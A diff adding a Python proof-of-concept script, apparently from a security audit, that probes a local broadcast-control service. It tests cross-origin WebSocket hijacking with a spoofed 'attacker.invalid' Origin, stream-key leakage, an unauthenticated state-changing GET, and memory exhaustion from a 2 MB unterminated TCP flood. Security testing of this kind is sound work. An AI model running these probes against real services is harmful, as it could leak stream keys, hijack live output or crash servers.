@@ -1,0 +1,87 @@
+import base64, hashlib, http.client, json, os, socket, struct, subprocess, sys, time
+HOST = "127.0.0.1"
+API, HTTP, TCP = map(int, sys.argv[1:4])
+ORIGIN = "https://attacker.invalid"
+def recv_until(sock, marker=b"\r\n\r\n"):
+    data = b""
+    while marker not in data:
+        data += sock.recv(4096)
+        if len(data) > 65536:
+            raise RuntimeError("header too large")
+    return data.split(marker, 1)
+def ws_frame(sock, stash):
+    def need(n):
+        nonlocal stash
+        while len(stash) < n:
+            chunk = sock.recv(max(4096, n-len(stash)))
+            if not chunk: raise EOFError()
+            stash += chunk
+        out, stash = stash[:n], stash[n:]
+        return out
+    a,b = need(2)
+    n = b & 127
+    if n == 126: n = struct.unpack("!H", need(2))[0]
+    if n == 127: n = struct.unpack("!Q", need(8))[0]
+    payload = need(n)
+    return (a & 15, payload), stash
+def ws_send_text(sock, text):
+    data = text.encode()
+    mask = os.urandom(4)
+    if len(data) < 126: hdr = bytes([0x81, 0x80 | len(data)])
+    else: hdr = bytes([0x81, 0x80 | 126]) + struct.pack("!H", len(data))
+    sock.sendall(hdr + mask + bytes(v ^ mask[i % 4] for i, v in enumerate(data)))
+s = socket.create_connection((HOST, API), timeout=5)
+key = base64.b64encode(os.urandom(16)).decode()
+handshake = (f"GET /api/v1/events HTTP/1.1\r\nHost: {HOST}:{API}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: {key}\r\nOrigin: {ORIGIN}\r\n\r\n").encode()
+s.sendall(handshake)
+header, stash = recv_until(s)
+print("ws_status", header.split(b"\r\n",1)[0].decode())
+snap = None
+for _ in range(5):
+    (opcode, payload), stash = ws_frame(s, stash)
+    if opcode == 1:
+        msg = json.loads(payload)
+        print("ws_message", msg.get("type"))
+        if msg.get("type") == "snapshot":
+            snap = msg
+            break
+if snap:
+    print("ws_stream_key_visible", any(o.get("settings",{}).get("stream",{}).get("streamKey") == "scan-canary-only" for o in snap["state"].get("outputs",[])))
+    ws_send_text(s, json.dumps({"id":1,"command":{"setPreview":{"input":3}}}))
+    for _ in range(6):
+        (opcode,payload),stash = ws_frame(s,stash)
+        if opcode == 1:
+            msg=json.loads(payload)
+            if msg.get("type") in ("receipt","error"):
+                print("ws_command_reply", msg.get("type"), msg.get("applied"), msg.get("error"))
+                break
+s.close()
+c=http.client.HTTPConnection(HOST,API,timeout=5)
+c.request("GET","/api/v1/state")
+r=c.getresponse(); state=json.loads(r.read())
+print("api_preview_after_ws",state["state"]["preview"])
+c.close()
+c=http.client.HTTPConnection(HOST,HTTP,timeout=5)
+c.request("GET","/api?Function=Cut",headers={"Origin":ORIGIN})
+r=c.getresponse(); body=r.read().decode()
+print("compat_origin_get",r.status,body[:80])
+c.close()
+c=http.client.HTTPConnection(HOST,API,timeout=5)
+c.request("GET","/api/v1/state")
+r=c.getresponse(); state=json.loads(r.read())
+print("api_program_after_compat",state["state"]["program"])
+c.close()
+def rss(pid):
+    return int(subprocess.check_output(["ps","-o","rss=","-p",str(pid)]).strip()) * 1024
+out=subprocess.check_output(["lsof","-ti",f"tcp:{TCP}"]).decode().strip().splitlines()
+pid=int(out[0])
+t=socket.create_connection((HOST,TCP),timeout=5)
+banner=t.recv(1024)
+print("tcp_banner",banner[:30].decode().strip())
+before=rss(pid)
+for i in range(32):
+    t.sendall(b"A"*65536)
+time.sleep(.5)
+after=rss(pid)
+print("tcp_unterminated_bytes",32*65536,"rss_before",before,"rss_after",after,"delta",after-before)
+t.close()
